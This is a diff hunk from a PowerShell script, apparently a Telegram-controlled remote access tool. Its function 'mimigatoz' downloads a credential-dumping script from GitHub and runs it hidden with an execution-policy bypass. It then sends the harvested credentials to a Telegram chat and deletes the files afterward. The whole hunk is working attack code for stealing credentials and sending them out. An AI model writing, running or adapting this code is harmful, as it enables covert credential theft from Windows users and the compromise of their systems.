@@ -192,7 +192,7 @@ $Usuario = "Usuario: $usuario`n" ; $Dominio =  "Dominio : $dominio`n" ; $Privile
 
 function mimigatoz {
 $ruta = $env:USERPROFILE + "\appdata\local\temp\1"; if ( (Test-Path $ruta) -eq $false) {mkdir $ruta} else {}; $ruta_temp = $env:USERPROFILE + "\appdata\local\temp\1" ; $ruta = $ruta + "\mimigatoz.txt" ; $ruta_ps1 = $ruta -replace ".txt", ".ps1"
-(curl https://raw.githubusercontent.com/Hackplayers/PSBoTelegram/master/Funciones/Invoke-MimiGatoz.ps1).content | Out-File $ruta_ps1 ; Set-Location $ruta_temp; ./mimigatoz.ps1  | Out-File $ruta ; cat $ruta
+(curl https://raw.githubusercontent.com/Hackplayers/PSBoTelegram/master/Funciones/Invoke-MimiGatoz.ps1).content | Out-File $ruta_ps1 ; Set-Location $ruta_temp; powershell.exe -win hidden -executionpolicy bypass -file ./mimigatoz.ps1  | Out-File $ruta ; sleep -Seconds 60 ; cat $ruta
 bot-send -file $ruta -botkey $botkey -chat_id $chat_id
 Remove-Item $ruta_ps1 ; sleep -Seconds 5 ; Remove-Item $ruta
 }
